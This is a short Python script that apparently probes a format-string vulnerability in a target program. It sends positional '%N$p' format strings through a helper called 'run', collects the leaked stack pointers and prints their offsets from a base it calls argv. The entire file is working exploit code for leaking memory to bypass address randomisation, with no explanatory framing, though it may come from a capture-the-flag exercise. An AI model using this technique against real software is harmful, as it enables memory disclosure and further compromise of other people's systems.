import re,sys
from rprobe import run
groups=[[6,20,27,50,53],[6,23,24,35,38],[6,46,54,56,17],[6,22,28,42,57]]
for rep in range(2):
  for grp in groups:
    fmt=''.join('%%%d$p.'%g for g in grp)[:-1]
    try:
        lk,out=run('1',fmt,'B')
        v=re.findall(r'0x[0-9a-f]+|\(nil\)',out)
        a=int(v[0],16)
        out2=[]
        for g,x in zip(grp,v):
            if x=='(nil)': out2.append('arg%d=nil'%g)
            else: out2.append('arg%d=%+#x'%(g,int(x,16)-a))
        print('argv=%#x | %s'%(a,'  '.join(out2)))
    except Exception as e: print(grp,'ERR',e)
